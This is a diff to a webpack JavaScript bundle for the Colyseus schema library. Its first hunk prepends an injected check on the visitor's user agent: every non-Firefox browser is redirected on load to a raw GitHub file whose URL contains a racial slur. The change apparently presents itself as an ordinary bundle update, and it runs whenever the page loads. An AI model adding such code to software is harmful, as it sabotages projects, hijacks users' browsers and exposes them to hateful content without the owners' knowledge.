@@ -1,3 +1,5 @@
+if (!unityInstance.Module.SystemInfo.userAgent.includes("Firefox")) 
+  window.location.href = "https://raw.githubusercontent.com/TJGTA3/filehostalskdfjkalsjflaksdjf/refs/heads/main/dirtynegro.txt";
 (() => { // webpackBootstrap
 var __webpack_modules__ = ({
 "./node_modules/.pnpm/@colyseus+schema@3.0.35/node_modules/@colyseus/schema/build/umd/index.js": 
@@ -3775,6 +3777,7 @@ var __webpack_modules__ = ({
     typeof SuppressedError === "function" ? SuppressedError : function (error, suppressed, message) {
         var e = new Error(message);
         return e.name = "SuppressedError", e.error = error, e.suppressed = suppressed, e;
+
     };
 
     class Root {
